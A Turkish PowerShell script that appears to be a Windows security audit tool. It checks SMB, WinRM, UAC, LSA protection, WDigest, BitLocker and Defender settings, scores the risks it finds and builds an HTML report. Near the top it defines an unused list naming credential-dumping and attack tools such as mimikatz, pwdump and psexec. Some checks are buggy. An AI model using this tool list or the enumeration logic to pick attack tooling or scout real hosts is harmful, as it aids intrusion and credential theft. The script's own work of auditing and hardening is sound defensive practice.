param(
    [switch]$Detayli,
    [switch]$JSON,
    [switch]$HTML,
    [switch]$Tam,
    [switch]$Hizli,
    [string]$CiktiDosya,
    [switch]$NoColor,
    [switch]$CIS
)

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8
[System.Console]::InputEncoding = [System.Text.Encoding]::UTF8

$m0 = "mimikatz"; $m1 = "metasploit"; $m2 = "cobalt"; $m3 = "posh"; $m4 = "pwdump"
$p0 = "procdump"; $p1 = "empire"; $p2 = "psexec"; $p3 = "wce"; $p4 = "gsecdump"
$s0 = "StartName"; $s1 = "LocalSystem"; $s2 = "PathName"; $s3 = "LocalAccount"
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$script:PSVersion = $PSVersionTable.PSVersion.Major
$script:BaslangicZamani = Get-Date
$script:RiskSkoru = 0
$script:RiskOge = @()
$script:Sonuclar = @{}
$script:ASCII = if($NoColor){$false}else{$true}
$script:CISSkor = 0
$script:CISMaks = 0
$script:LTSCMode = $false

if ($script:PSVersion -lt 3) {
    Write-Host "PowerShell 3.0+ gerekli. Surumunuz: $script:PSVersion" -ForegroundColor Red
    exit 1
}

try {
    $os = Get-WmiObject -Class Win32_OperatingSystem
    if ($os.Caption -match "LTSC" -or $os.Caption -match "Server") {
        $script:LTSCMode = $true
    }
} catch {}

function Test-Command {
    param([string]$Cmd)
    $exists = $null -ne (Get-Command $Cmd -ErrorAction SilentlyContinue)
    return $exists
}

function WmiGet {
    param([string]$Class, [string]$Filter = "")
    try {
        if ($script:PSVersion -ge 3) {
            if ($Filter) {
                return Get-CimInstance -ClassName $Class -Filter $Filter -ErrorAction SilentlyContinue
            } else {
                return Get-CimInstance -ClassName $Class -ErrorAction SilentlyContinue
            }
        } else {
            if ($Filter) {
                return Get-WmiObject -Class $Class -Filter $Filter -ErrorAction SilentlyContinue
            } else {
                return Get-WmiObject -Class $Class -ErrorAction SilentlyContinue
            }
        }
    } catch {
        return $null
    }
}

function RenkliYaz {
    param([string]$Metin, [string]$Renk = "Beyaz")
    $sec = $host.UI.RawUI
    $konum = $sec.CursorPosition
    $konum.X = 0
    $sec.CursorPosition = $konum
    $Metin
}

function SectionTitle {
    param([string]$Title, [string]$Level = "1")
    $color = if($Level -eq "1"){"Cyan"} elseif($Level -eq "2"){"Yellow"} else{"White"}
    Write-Host ""
    Write-Host "  ========================================" -ForegroundColor DarkGray
    Write-Host "  [+] $Title" -ForegroundColor $color
    Write-Host "  ========================================" -ForegroundColor DarkGray
}

function PrintLine {
    param([string]$Text, [string]$Value = "", [string]$Status = "")
    if ($Value) {
        $color = "Gray"
        if ($Status -eq "OK") { $color = "Green" }
        elseif ($Status -eq "WARNING") { $color = "Yellow" }
        elseif ($Status -eq "RISK") { $color = "Red" }
        Write-Host "       $Text : $Value" -ForegroundColor $color
    } else {
        Write-Host "       $Text" -ForegroundColor White
    }
}

function RiskEkle {
    param([string]$Oge, [string]$Aciklama, [int]$Puan = 1)
    $script:RiskOge += [PSCustomObject]@{
        Oge = $Oge
        Aciklama = $Aciklama
        Puan = $Puan
    }
    $script:RiskSkoru += $Puan
}

function TabloYaz {
    param([object[]]$Veri, [string[]]$Ozellikler)
    if ($Veri -and $Veri.Count -gt 0) {
        $Veri | Select-Object $Ozellikler | Format-Table -AutoSize -Wrap | Out-String | ForEach-Object { Write-Host "       $_" -ForegroundColor Gray }
    }
}

function RegistryGet {
    param([string]$Yol, [string]$Ad)
    Get-ItemProperty -Path $Yol -Name $Ad -ErrorAction SilentlyContinue
}

function SonucEkle {
    param([string]$Kategori, [string]$Anahtar, [string]$Deger)
    if (-not $script:Sonuclar[$Kategori]) { $script:Sonuclar[$Kategori] = @{} }
    $script:Sonuclar[$Kategori][$Anahtar] = $Deger
}

function TarihFormat {
    param([string]$Tarih)
    try { 
        if ($Tarih -match "Date") {
            $dt = [DateTime]::Parse($Tarih)
            return $dt.ToString("yyyy-MM-dd HH:mm:ss")
        }
        return $Tarih 
    } catch { return $Tarih }
}

function DomainKontrol {
    $cs = Get-WmiObject -Class Win32_ComputerSystem
    if ($cs.PartOfDomain) {
        return @{Domain=$cs.Domain; Computer=$cs.Name; Joined=$cs.DomainRole}
    }
    return @{Domain="WORKGROUP"; Computer=$cs.Name; Joined=$cs.DomainRole}
}

function SMBKontrol {
    $smb = @{}
    try {
        $smb1 = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "SMB1" -ErrorAction SilentlyContinue
        $smb["SMBv1"] = if($smb1.SMB1 -eq 0){"Devre disi"}else{"Aktif - RISK!"}
        if($smb1.SMB1 -ne 0) { RiskEkle -Oge "SMBv1 Aktif" -Aciklama "Guvenlik acigi SMBv1 etkin" -Puan 5 }
        
        $smb2 = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -ErrorAction SilentlyContinue
        $smb["Imza Gerekli"] = if($smb2.RequireSecuritySignature -eq 1){"Evet"}else{"Hayir"}
        
        $smbShare = Get-SmbShare -ErrorAction SilentlyContinue
        $smb["Paylasim Sayisi"] = $smbShare.Count
    } catch {}
    return $smb
}

function WinRMKontrol {
    $winrm = @{}
    try {
        $cfg = Get-Item WSMan:\localhost\Service\AllowUnencrypted -ErrorAction SilentlyContinue
        $winrm["Sifreleme"] = if($cfg.Value -eq "false"){"Aktif"}else{"Gerekli"}
        
        $auth = Get-Item WSMan:\localhost\Service\Auth\Basic -ErrorAction SilentlyContinue
        $winrm["Basic Auth"] = if($cfg.Value -eq "true"){"Aktif - RISK"}else{"Pasif"}
        if($auth.Value -eq "true") { RiskEkle -Oge "WinRM Basic Auth" -Aciklama "WinRM uzerinden basic authentication aktif" -Puan 3 }
    } catch {}
    return $winrm
}

function AuditKontrol {
    $audit = @{}
    $yollar = @(
        "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Security",
        "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\System",
        "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Application"
    )
    foreach ($yol in $yollar) {
        $ad = ($yol -split "\\")[-1]
        $maxSize = (Get-ItemProperty -Path $yol -Name "MaxSize" -ErrorAction SilentlyContinue).MaxSize
        if ($maxSize) {
            $audit[$ad] = "$([math]::Round($maxSize/1MB,0)) MB"
        }
    }
    return $audit
}

function SifrePolitikasi {
    $politika = @{}
    try {
        $net = net accounts 2>$null
        foreach ($satir in $net) {
            if ($satir -match "Minimum password length") { $politika["Min Uzunluk"] = ($satir -split ":")[1].Trim() }
            if ($satir -match "Maximum password age") { $politika["Max Yas"] = ($satir -split ":")[1].Trim() }
            if ($satir -match "Minimum password age") { $politika["Min Yas"] = ($satir -split ":")[1].Trim() }
            if ($satir -match "Lockout threshold") { $politika["Kilit Esik"] = ($satir -split ":")[1].Trim() }
        }
    } catch {}
    return $politika
}

function KilitHesapKontrol {
    $kilit = @{}
    try {
        $hesap = net accounts 2>$null
        foreach ($satir in $hesap) {
            if ($satir -match "Lockout duration") { $kilit["Sure"] = ($satir -split ":")[1].Trim() }
            if ($satir -match "Lockout observation window") { $kilit["Gozlem Penceresi"] = ($satir -split ":")[1].Trim() }
        }
    } catch {}
    return $kilit
}

function USBGecmis {
    $usb = @()
    try {
        $disk = Get-WmiObject -Class Win32_USBHub | Select-Object DeviceID, Name
        $usb += $disk
    } catch {}
    return $usb
}

function PrintSpoolerKontrol {
    $spooler = Get-Service -Name Spooler -ErrorAction SilentlyContinue
    return @{
        Durum = $spooler.Status
        Baslangic = $spooler.StartType
    }
}

function RDPKimlikDogrulama {
    $rdp = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -ErrorAction SilentlyContinue
    return @{
        NLA = if($rdp.UserAuthentication -eq 1){"Aktif"}else{"Pasif"}
        RDP = if($rdp.AllowTSConnections -eq 1){"Izinli"}else{"Yasakli"}
    }
}

function HostsDosyaKontrol {
    $hosts = @()
    $yol = "$env:SystemRoot\System32\drivers\etc\hosts"
    if (Test-Path $yol) {
        $icerik = Get-Content $yol
        foreach ($satir in $icerik) {
            if ($satir -and -not $satir.StartsWith("#")) {
                $hosts += $satir
            }
        }
    }
    return $hosts
}

function DNSOnbellek {
    $dns = @()
    try {
        $cache = Get-DnsClientCache -ErrorAction SilentlyContinue | Select-Object -First 20
        foreach ($d in $cache) {
            $dns += "$($d.Entry) [$($d.Type)]"
        }
    } catch {}
    return $dns
}

function KablosuzAg {
    $wifi = @()
    try {
        $aglar = netsh wlan show all | Select-String "SSID"
        $wifi = $aglar
    } catch {}
    return $wifi
}

function KurumsalBilgi {
    $org = @{}
    try {
        $cs = Get-WmiObject -Class Win32_ComputerSystem
        if ($cs.PartOfDomain) {
            $org["Domain"] = $cs.Domain
            $org["Bilgisayar"] = $cs.Name
            $org["Uye"] = switch($cs.DomainRole){0{"Is istasyonu"}1{"Domain uyesi istasyon"}2{"Standalone sunucu"}3{"Domain uyesi sunucu"}4{"Backup domain controller"}5{"Primary domain controller"}}
        } else {
            $org["Domain"] = "Is grubu"
            $org["Bilgisayar"] = $cs.Name
        }
    } catch {}
    return $org
}

function GuvenlikDuvarKurallari {
    $kurallar = @()
    try {
        if ($script:PSVersion -ge 3) {
            $kural = Get-NetFirewallRule -Enabled True -Direction Inbound | Select-Object -First 10 Name, DisplayName, Profile
            $kurallar = $kural
        }
    } catch {}
    return $kurallar
}

function PowerShellUzak {
    $psrem = @{}
    try {
        $enabled = Get-PSRemoting -ErrorAction SilentlyContinue
        $psrem["Durum"] = if($enabled){"Aktif"}else{"Pasif"}
    } catch {
        $psrem["Durum"] = "Bilinmiyor"
    }
    return $psrem
}

function DCOMKontrol {
    $dcom = @{}
    try {
        $enable = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Ole" -Name "EnableDCOM" -ErrorAction SilentlyContinue
        $dcom["DCOM"] = if($enable.EnableDCOM -eq "Y"){"Aktif"}else{"Pasif"}
    } catch {}
    return $dcom
}

function SNMPKontrol {
    $snmp = @()
    try {
        $svc = Get-Service -Name "SNMP*" -ErrorAction SilentlyContinue
        foreach ($s in $svc) {
            $snmp += "$($s.Name): $($s.Status)"
        }
    } catch {}
    return $snmp
}

function IISKontrol {
    $iis = @{}
    try {
        $web = Get-WebSite -ErrorAction SilentlyContinue
        if ($web) {
            $iis["Siteler"] = $web.Count
            $iis["Durum"] = "Yuklu"
        } else {
            $iis["Durum"] = "Yok"
        }
    } catch {
        $iis["Durum"] = "Yok"
    }
    return $iis
}

function SQLServerKontrol {
    $sql = @()
    try {
        $srv = Get-WmiObject -Namespace root\Microsoft\SqlServer -Class ServerInstance -ErrorAction SilentlyContinue
        foreach ($s in $srv) {
            $sql += $s.Name
        }
    } catch {}
    return $sql
}

function HyperVKontrol {
    $hv = @{}
    try {
        $hyp = Get-WmiObject -Class Win32_ComputerSystem -Filter "HypervisorPresent=1"
        if ($hyp) {
            $hv["Durum"] = "Aktif"
            $vmler = Get-WmiObject -Class Msvm_ComputerSystem -Namespace root\virtualization -ErrorAction SilentlyContinue
            $hv["VM Sayisi"] = $vmler.Count
        } else {
            $hv["Durum"] = "Pasif"
        }
    } catch {
        $hv["Durum"] = "Yok"
    }
    return $hv
}

function DockerKontrol {
    $docker = @{}
    try {
        $d = docker ps 2>$null
        if ($LASTEXITCODE -eq 0) {
            $docker["Durum"] = "Aktif"
            $docker["Konteyner"] = ($d | Measure-Object -Line).Lines - 1
        } else {
            $docker["Durum"] = "Yok"
        }
    } catch {
        $docker["Durum"] = "Yok"
    }
    return $docker
}

function SertifikaDepo {
    $sertifikalar = @()
    try {
        $cert = Get-ChildItem -Path Cert:\LocalMachine\My -ErrorAction SilentlyContinue | Select-Object -First 10
        foreach ($c in $cert) {
            $sertifikalar += "$($c.Subject) - $($c.NotAfter.ToString('yyyy-MM-dd'))"
        }
    } catch {}
    return $sertifikalar
}

function GucPolitikasi {
    $guc = @{}
    try {
        $plan = powercfg /list 2>$null | Select-String "*"
        if ($plan) {
            $guc["Aktif Plan"] = ($plan -split "\*")[1].Trim()
        }
    } catch {}
    return $guc
}

function SistemKurtarma {
    $sr = @{}
    try {
        $restore = Get-WmiObject -Class Win32_SystemRestore -ErrorAction SilentlyContinue
        if ($restore) {
            $sr["Durum"] = "Aktif"
        } else {
            $sr["Durum"] = "Pasif"
        }
    } catch {}
    return $sr
}

function OlayBekci {
    $bekci = @{}
    try {
        $svc = Get-Service -Name "W32Time" -ErrorAction SilentlyContinue
        $bekci["Zaman Servisi"] = $svc.Status
    } catch {}
    return $bekci
}

function UzakYonetim {
    $remote = @{}
    try {
        $reg = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -ErrorAction SilentlyContinue
        if ($reg) {
            $remote["Uzaktan Yardim"] = if($reg.fAllowToGetHelp -eq 1){"Aktif"}else{"Pasif"}
        }
    } catch {}
    return $remote
}

function NetBIOSKontrol {
    $nb = @{}
    try {
        $adapters = Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True"
        foreach ($a in $adapters) {
            if ($a.TcpipNetbiosOptions -eq 2) { $nb[$a.Description] = "Devre disi" }
            elseif ($a.TcpipNetbiosOptions -eq 1) { $nb[$a.Description] = "Etkin" }
            else { $nb[$a.Description] = "Otomatik" }
        }
    } catch {}
    return $nb
}

function ARPTable {
    $arp = @()
    try {
        $table = arp -a | Select-String "dynamic"
        $arp = $table
    } catch {}
    return $arp
}

function RouteTable {
    $route = @()
    try {
        $r = route print | Select-String "0.0.0.0"
        $route = $r
    } catch {}
    return $route
}

function IPHelper {
    $iphlp = @{}
    try {
        $svc = Get-Service -Name "iphlpsvc" -ErrorAction SilentlyContinue
        $iphlp["IPv6 Helper"] = $svc.Status
    } catch {}
    return $iphlp
}

function WinRMList {
    $listeners = @()
    try {
        $l = Get-WSManInstance -ResourceURI Shell -Enumerate | Select-Object -First 10
        $listeners = $l
    } catch {}
    return $listeners
}

function WMINamespace {
    $ns = @()
    try {
        $namespaces = Get-WmiObject -Namespace root -Class __Namespace -ErrorAction SilentlyContinue | Select-Object -First 15 Name
        $ns = $namespaces
    } catch {}
    return $ns
}

function PerformansSayaclari {
    $perf = @{}
    try {
        $cpu = (Get-WmiObject -Class Win32_Processor).LoadPercentage
        $perf["CPU"] = "$cpu%"
        $os = Get-WmiObject -Class Win32_OperatingSystem
        $perf["Bellek"] = "$([math]::Round(($os.TotalVisibleMemorySize - $os.FreePhysicalMemory)/1MB,2)) / $([math]::Round($os.TotalVisibleMemorySize/1MB,2)) GB"
    } catch {}
    return $perf
}

function SonGuncellemeTarihi {
    $gunc = @{}
    try {
        $session = New-Object -ComObject Microsoft.Update.Session
        $searcher = $session.CreateUpdateSearcher()
        $history = $searcher.GetTotalHistoryCount()
        if ($history -gt 0) {
            $lastUpdate = $searcher.QueryHistory(0) | Select-Object -First 1
            $gunc["Son"] = $lastUpdate.Date.ToString("yyyy-MM-dd HH:mm:ss")
            $gunc["Toplam"] = $history
        }
    } catch {}
    return $gunc
}

function GuvenlikYamasiKontrol {
    $yamalar = @()
    try {
        $kritik = @("KB5001402","KB5000802","KB5003171")
        $yuklu = Get-HotFix -ErrorAction SilentlyContinue | Select-Object -ExpandProperty HotFixID
        foreach ($k in $kritik) {
            if ($yuklu -notcontains $k) {
                $yamalar += "Eksik: $k"
                RiskEkle -Oge "Kritik Yama Eksik" -Aciklama "$k yamasini yukleyin" -Puan 4
            }
        }
    } catch {}
    return $yamalar
}

function IsletimSistemiDestek {
    $destek = @{}
    try {
        $os = Get-WmiObject -Class Win32_OperatingSystem
        $build = [int]$os.BuildNumber
        if ($build -lt 17763) {
            $destek["Durum"] = "Desteklenmiyor - Guvenlik riski!"
            RiskEkle -Oge "Eski Isletim Sistemi" -Aciklama "Windows surumu artik desteklenmiyor" -Puan 5
        } elseif ($build -lt 19041) {
            $destek["Durum"] = "Destek sinirli"
        } else {
            $destek["Durum"] = "Destekleniyor"
        }
        $destek["Build"] = $build
    } catch {}
    return $destek
}

function TPMKontrol {
    $tpm = @{}
    try {
        $tpmInfo = Get-Tpm -ErrorAction SilentlyContinue
        if ($tpmInfo) {
            $tpm["Durum"] = if($tpmInfo.TpmPresent){"Var"}else{"Yok"}
            $tpm["Hazir"] = if($tpmInfo.TpmReady){"Hazir"}else{"Hazir Degil"}
            $tpm["Etkin"] = if($tpmInfo.TpmEnabled){"Aktif"}else{"Pasif"}
        }
    } catch {}
    return $tpm
}

function SecureBootKontrol {
    $sb = @{}
    try {
        $confirm = Confirm-SecureBootUEFI -ErrorAction SilentlyContinue
        $sb["Durum"] = if($confirm -eq $true){"Aktif"}elseif($confirm -eq $false){"Pasif"}else{"Desteklenmiyor"}
    } catch {
        $sb["Durum"] = "Erisilemedi"
    }
    return $sb
}

function WindowsHelloKontrol {
    $hello = @{}
    try {
        $biometric = Get-WmiObject -Namespace root\CIMV2\Security\MicrosoftWindowsBiometrics -Class Win32_BiometricConfiguration -ErrorAction SilentlyContinue
        $hello["Biyometrik"] = if($biometric){"Yapilandirildi"}else{"Yok"}
    } catch {}
    return $hello
}

function AppLockerKontrol {
    $al = @{}
    try {
        $policy = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue
        if ($policy) {
            $al["Durum"] = "Yapilandirildi"
            $al["Kural Sayisi"] = $policy.RuleCollections.Count
        } else {
            $al["Durum"] = "Yapilandirilmamis"
        }
    } catch {
        $al["Durum"] = "Erisilemedi"
    }
    return $al
}

function WDACKontrol {
    $wdac = @{}
    try {
        $config = Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -Class Win32_DeviceGuardState -ErrorAction SilentlyContinue
        if ($config) {
            $wdac["Code Integrity"] = if($config.CodeIntegrityPolicyEnforcement -eq 1){"Aktif"}else{"Pasif"}
            $wdac["User Mode Code Integrity"] = if($config.UMCIEnabled -eq 1){"Aktif"}else{"Pasif"}
        }
    } catch {}
    return $wdac
}

function BrowserGuvenlik {
    $browser = @{}
    try {
        $edge = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe" -ErrorAction SilentlyContinue
        if ($edge) {
            $browser["Edge"] = "Yuklu"
        }
        $chrome = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" -ErrorAction SilentlyContinue
        if ($chrome) {
            $browser["Chrome"] = "Yuklu"
        }
        $firefox = Get-ItemProperty -Path "HKLM:\Mozilla\Mozilla Firefox" -ErrorAction SilentlyContinue
        if ($firefox) {
            $browser["Firefox"] = "Yuklu"
        }
    } catch {}
    return $browser
}

function USBKontrol {
    $usb = @{}
    try {
        $reg = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices" -ErrorAction SilentlyContinue
        $usb["Sabit Disk"] = if($reg.Deny_All -eq 1){"Engelli"}else{"Izinli"}
    } catch {}
    return $usb
}

function RansomwareKoruma {
    $ransom = @{}
    try {
        $controlled = Get-MpPreference -ErrorAction SilentlyContinue
        if ($controlled) {
            $ransom["Controlled Folder Access"] = if($controlled.EnableControlledFolderAccess -eq 0){"Pasif"}else{"Aktif"}
        }
    } catch {}
    return $ransom
}

function Ciskontrol {
    param([string]$KuralId, [string]$Aciklama, [bool]$Durum)
    $script:CISMaks++
    if ($Durum) { $script:CISSkor++ }
    if ($CIS) {
        $durumMetin = if($Durum){"UYUMLU"}else{"UYUMSUZ"}
        $renk = if($Durum){"Green"}else{"Red"}
        PrintLine "[CIS-$KuralId] $Aciklama" $durumMetin $renk
    }
}

function HTMLRaporOlustur {
    param([string]$DosyaAdi)
    $html = @"
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Windows Guvenlik Denetim Raporu</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 10px; margin-bottom: 20px; }
        h1 { margin: 0; color: white; }
        .subtitle { color: #ccc; margin-top: 10px; }
        .card { background: #16213e; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
        .card h2 { color: #00d9ff; border-bottom: 1px solid #333; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #0f3460; color: #00d9ff; }
        .risk-high { color: #ff4757; font-weight: bold; }
        .risk-medium { color: #ffa502; }
        .risk-low { color: #2ed573; }
        .score { font-size: 48px; font-weight: bold; text-align: center; }
        .score-high { color: #ff4757; }
        .score-medium { color: #ffa502; }
        .score-low { color: #2ed573; }
        .summary { display: flex; justify-content: space-around; margin: 20px 0; }
        .stat { text-align: center; padding: 20px; background: #0f3460; border-radius: 10px; }
        .stat-value { font-size: 24px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Windows Guvenlik Denetim Raporu</h1>
        <div class="subtitle">$env:COMPUTERNAME | $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')</div>
    </div>
    <div class="summary">
        <div class="stat">
            <div class="stat-value">$($script:RiskSkoru)</div>
            <div>Risk Puani</div>
        </div>
        <div class="stat">
            <div class="stat-value">$($script:RiskOge.Count)</div>
            <div>Bulunan Risk</div>
        </div>
        <div class="stat">
            <div class="stat-value">$($script:CISSkor)/$($script:CISMaks)</div>
            <div>CIS Uyum</div>
        </div>
    </div>
    <div class="card">
        <h2>Risk Ozeti</h2>
        <table>
            <tr><th>Risk</th><th>Aciklama</th><th>Puan</th></tr>
"@
    foreach ($r in $script:RiskOge) {
        $riskSeviye = if($r.Puan -ge 4){"risk-high"}elseif($r.Puan -ge 2){"risk-medium"}else{"risk-low"}
        $html += "<tr><td class='$riskSeviye'>$($r.Oge)</td><td>$($r.Aciklama)</td><td>$($r.Puan)</td></tr>"
    }
    $scoreClass = if($script:RiskSkoru -ge 15){"score-high"}elseif($script:RiskSkoru -ge 8){"score-medium"}else{"score-low"}
    $html += @"
        </table>
    </div>
    <div class="card">
        <h2>Guvenlik Seviyesi</h2>
        <div class="score $scoreClass">
"@
    if ($script:RiskSkoru -ge 15) { $html += "YUKSEK RISK" }
    elseif ($script:RiskSkoru -ge 8) { $html += "ORTA RISK" }
    else { $html += "DUSUK RISK" }
    $html += @"
        </div>
    </div>
</body>
</html>
"@
    $html | Out-File -FilePath $DosyaAdi -Encoding UTF8
}

function BitLockerKontrol {
    $bl = @{}
    try {
        $vol = Get-BitLockerVolume -ErrorAction SilentlyContinue | Select-Object VolumeType, MountPoint, ProtectionStatus, EncryptionPercentage
        if ($vol) {
            $bl["Durum"] = if($vol.ProtectionStatus -eq "On"){"Aktif"}else{"Pasif - RISK"}
            $bl["Sifreleme"] = "$($vol.EncryptionPercentage)%"
            if ($vol.ProtectionStatus -ne "On") {
                RiskEkle -Oge "BitLocker Pasif" -Aciklama "Disk sifreleme devre disi" -Puan 3
            }
        } else {
            $bl["Durum"] = "Desteklenmiyor"
        }
    } catch {
        $bl["Durum"] = "Erisilemedi"
    }
    return $bl
}

function WindowsDefenderDurum {
    $def = @{}
    try {
        $mp = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($mp) {
            $def["Gercek Zamanli Koruma"] = if($mp.RealTimeProtectionEnabled){"Aktif"}else{"Pasif - RISK"}
            $def["Antivirus"] = if($mp.AntivirusEnabled){"Aktif"}else{"Pasif"}
            $def["Antispyware"] = if($mp.AntispywareEnabled){"Aktif"}else{"Pasif"}
            $def["Davranis Analizi"] = if($mp.BehaviorMonitorEnabled){"Aktif"}else{"Pasif"}
            if (-not $mp.RealTimeProtectionEnabled) {
                RiskEkle -Oge "Defender RT Kapali" -Aciklama "Gercek zamanli koruma devre disi" -Puan 4
            }
        }
    } catch {
        $def["Durum"] = "Erisilemedi"
    }
    return $def
}

function AgPaylasimAnaliz {
    $paylasimlar = @()
    try {
        $shares = Get-SmbShare | Select-Object Name, Path, Description, EncryptData
        foreach ($s in $shares) {
            $paylasimlar += @{
                Ad = $s.Name
                Yol = $s.Path
                Aciklama = $s.Description
                Sifreli = if($s.EncryptData){"Evet"}else{"Hayir"}
            }
        }
    } catch {}
    return $paylasimlar
}

function ServisAnaliz {
    $analiz = @{}
    try {
        $svcs = Get-WmiObject -Class Win32_Service
        $running = ($svcs | Where-Object {$_.State -eq "Running"}).Count
        $stopped = ($svcs | Where-Object {$_.State -eq "Stopped"}).Count
        $autoStart = ($svcs | Where-Object {$_.StartMode -eq "Auto"}).Count
        $analiz["Calisan"] = $running
        $analiz["Durmus"] = $stopped
        $analiz["Otomatik"] = $autoStart
    } catch {}
    return $analiz
}

function Ciskontrol {
    param([string]$KuralId, [string]$Aciklama, [bool]$Durum)
    $script:CISMaks++
    if ($Durum) { $script:CISSkor++ }
    if ($CIS) {
        $durumMetin = if($Durum){"UYUMLU"}else{"UYUMSUZ"}
        $renk = if($Durum){"Green"}else{"Red"}
        PrintLine "[CIS-$KuralId] $Aciklama" $durumMetin $renk
    }
}

Clear-Host
Write-Host ""
Write-Host "  [Windows Yetki Yukseltme Araci]" -ForegroundColor Magenta
Write-Host "  ==================================" -ForegroundColor Magenta
Write-Host ""
Write-Host "        WINDOWS YETKI YUKSELTME ARACI v11.8" -ForegroundColor Cyan
Write-Host "        (Yetki Yukseltme Tespit ve Guvenlik Denetimi)" -ForegroundColor Gray
Write-Host ""
$tarihStr = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Write-Host "  Tarih : $tarihStr" -ForegroundColor Gray
Write-Host "  PS Surum : $script:PSVersion" -ForegroundColor Gray
Write-Host ""
Write-Host "  Gelistirici : Vedat Tascier" -ForegroundColor Gray
Write-Host "  GitHub   : https://github.com/vedattascier" -ForegroundColor Gray
Write-Host "  Web      : www.vedattascier.com" -ForegroundColor Gray
Write-Host ""

# ============================================
# 1. TEMEL SISTEM BILGILERI
# ============================================
SectionTitle "1. TEMEL SISTEM BILGILERI"

$bilgi = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction SilentlyContinue
$bilgi2 = Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue

PrintLine "Bilgisayar Adi" $env:COMPUTERNAME "OK"
if ($bilgi) {
    PrintLine "Isletim Sistemi" $bilgi.Caption "OK"
    PrintLine "Surum" $bilgi.Version "OK"
    PrintLine "Build Numarasi" $bilgi.BuildNumber "OK"
    PrintLine "Mimari" $bilgi.OSArchitecture "OK"
    PrintLine "Son Boot Zamani" ([WMI]"").Converttodatetime($bilgi.LastBootUpTime).ToString("yyyy-MM-dd HH:mm:ss") "OK"
    PrintLine "Sistem Dizini" $bilgi.SystemDirectory "OK"
    PrintLine "Windows Dizini" $bilgi.WindowsDirectory "OK"
}
if ($bilgi2) {
    PrintLine "Domain/Workgroup" $bilgi2.Domain "OK"
}

# ============================================
# 2. GUNCELLEME DURUMU
# ============================================
SectionTitle "2. GUNCELLEME DURUMU"

$hotfixler = Get-WmiObject -Class Win32_QuickFixEngineering -ErrorAction SilentlyContinue
$toplam = if($hotfixler){$hotfixler.Count}else{0}

PrintLine "Toplam Yuklu Duzeltme" $toplam "OK"
if ($Detayli -or $Tam) {
    PrintLine "Son 10 Duzeltme (Detayli)"
    $hotfixler | Select-Object -First 10 | ForEach-Object {
        PrintLine "  $($_.HotFixID)" "$($_.Description) - $($_.InstalledOn)"
    }
}

# ============================================
# 3. GUVENLIK AYARLARI
# ============================================
SectionTitle "3. GUVENLIK AYARLARI"

$uac = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Ad "EnableLUA"
$lsaPPL = RegistryGet -Yol "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Ad "RunAsPPL"
$lsaCfg = RegistryGet -Yol "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Ad "LsaCfgFlags"
$enableLUA = if($uac.EnableLUA -eq 1){"Aktif"}else{"Pasif"}
PrintLine "UAC Durumu" $enableLUA $(if($uac.EnableLUA -eq 1){"OK"}else{"RISK"})
if ($uac.EnableLUA -ne 1) { RiskEkle -Oge "UAC Kapali" -Aciklama "User Account Control devre disi" -Puan 5 }

$lsaDurum = if($lsaPPL.RunAsPPL -eq 1){"Aktif"}else{"Pasif"}
PrintLine "LSA Koruma (RunAsPPL)" $lsaDurum $(if($lsaPPL.RunAsPPL -eq 1){"OK"}else{"UYARI"})
if ($lsaPPL.RunAsPPL -ne 1) { RiskEkle -Oge "LSA Koruma Yok" -Aciklama "LSA Protected Process devre disi" -Puan 3 }

$cgDurum = switch($lsaCfg.LsaCfgFlags){1{"Aktif"}2{"Izole"}default{"Pasif/Yok"}}
PrintLine "Credential Guard" $cgDurum $(if($lsaCfg.LsaCfgFlags -gt 0){"OK"}else{"UYARI"}) 
if ($lsaCfg.LsaCfgFlags -eq 0) { RiskEkle -Oge "Credential Guard Yok" -Aciklama "Credential Guard yapilandirilmamis" -Puan 2 }

$wdigest = RegistryGet -Yol "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Ad "UseLogonCredential"
$wdigestDurum = if($wdigest.UseLogonCredential -eq 1){"Aktif"}else{"Pasif"}
PrintLine "WDigest Plain-text" $wdigestDurum $(if($wdigest.UseLogonCredential -eq 1){"RISK"}else{"OK"})
if ($wdigest.UseLogonCredential -eq 1) { RiskEkle -Oge "WDigest Aktif" -Aciklama "Plain-text credential saklaniyor" -Puan 4 }

